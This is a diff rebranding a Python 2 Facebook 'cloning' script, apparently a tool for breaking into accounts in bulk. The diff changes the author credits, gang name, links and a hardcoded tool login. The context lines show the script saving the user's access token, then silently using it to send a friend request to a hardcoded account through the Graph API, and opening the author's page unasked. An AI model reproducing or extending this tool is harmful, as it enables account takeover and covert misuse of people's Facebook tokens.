@@ -37,18 +37,18 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
-   Asif Javed
+   Ijaz Afridi
    ▄︻̷̿┻̿═━一
-   THE ANONYMOUS lovehacker TRICKER 
-   THE LEGEND ℒℴνℯ
-   THE GAME CHANGER ℒℴνℯ
-   pakistani hackers
-   ℒℴνℯ ▄︻̷̿┻̿═━一
+   THE ANONYMOUS AHKHACKER 
+   THE LEGEND 𝓐𝓯𝓻𝓲𝓭𝓲
+   THE GAME CHANGER 𝓐𝓯𝓻𝓲𝓭𝓲
+   Pakistani hackers
+   𝓐𝓯𝓻𝓲𝓭𝓲 ▄︻̷̿┻̿═━一
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mPakistani Hackers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mIjaz Afridi
+\033[1;96mGang    \033[1;93m: \033[1;92mBadmash Ahk
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/Mrbadmash/ahkhacker06
+\033[1;96mFb Page \033[1;93m: \033[1;92m Mr_Ijaz_official302
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -66,14 +66,14 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mlovehacker
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mIjaz Afridi
+\033[1;96mGang    \033[1;93m: \033[1;92mBadmash
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/Mrbadmash
+\033[1;96mFb Page \033[1;93m: \033[1;92m Mr_Ijaz_official302 
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-CorrectUsername = "lovehacker"
-CorrectPassword = "03094161457"
+CorrectUsername = "afridi"
+CorrectPassword = "afridi"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -84,10 +84,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 def login():
 	os.system('clear')
 	try:
@@ -127,7 +127,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -173,7 +173,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH AHK"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
